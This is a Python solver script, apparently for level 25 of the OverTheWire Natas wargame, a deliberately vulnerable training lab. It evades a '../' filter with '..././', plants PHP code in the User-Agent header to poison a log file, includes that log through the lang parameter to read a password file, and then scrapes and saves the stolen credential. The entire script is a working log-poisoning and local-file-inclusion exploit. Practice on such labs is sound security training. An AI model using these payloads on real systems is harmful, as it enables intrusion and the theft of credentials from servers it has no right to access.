import re, requests, base64, natas, string, random

B64 = 'Basic %s' % base64.b64encode('%s:%s' % ('natas25',natas.get_credential('natas25')))
URL = 'http://natas25.natas.labs.overthewire.org/index.php?lang=..././logs/natas25_%s.log'
USER_AGENT = '<?php include "/etc/natas_webpass/natas26"; ?>'

def main():
    session = random_string()

    response = requests.get(
            URL % session,
            headers= {
                'Authorization':B64,
                'User-Agent':USER_AGENT
            },
            cookies=dict(PHPSESSID=session)
    )

    regex = r"\[\d{2}\.\d{2}\.\d{4}\s\d{2}::\d{2}:\d{2}\]\s(\w{32})"
    matches = re.finditer(regex,response.content,re.MULTILINE)

    for match in matches:
        print('found password: %s' % match.group(1))
        print('adding to credentials....')
        natas.save_credentials('natas26',match.group(1))
        print('done')


def random_string(string_length=20):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(string_length))

if __name__ == '__main__':
    main()
